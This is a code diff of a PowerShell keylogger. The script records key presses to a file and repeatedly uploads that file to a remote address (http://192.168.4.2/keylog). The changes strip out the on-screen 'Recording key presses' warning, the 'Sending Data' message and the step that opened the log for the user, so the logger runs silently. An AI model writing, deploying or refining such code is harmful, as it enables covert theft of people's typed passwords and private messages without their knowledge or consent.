@@ -18,12 +18,11 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
     $null = New-Item -Path $Path -ItemType File -Force
 
     try {
-        Write-Host 'Recording key presses. Press CTRL+C to see results.' -ForegroundColor Red
-        
+    
         $startdate = Get-Date
         # create endless loop. When user presses CTRL+C, finally-block
         # executes and shows the collected key presses
-        while ($true) {
+       while($true){
             Start-Sleep -Milliseconds 40
 
             #Envoie des données
@@ -32,8 +31,6 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
                 
                 $wc = New-object System.Net.WebClient
                 $resp = $wc.UploadFile('http://192.168.4.2/keylog',$Path)
-
-                Write-Host 'Sending Data....'
             }
 
             # scan all ASCII codes above 8
@@ -61,10 +58,6 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
                 }
             }
         }
-    }
-    finally {
-        # open logger file in Notepad
-        notepad $Path
     }
 }
 
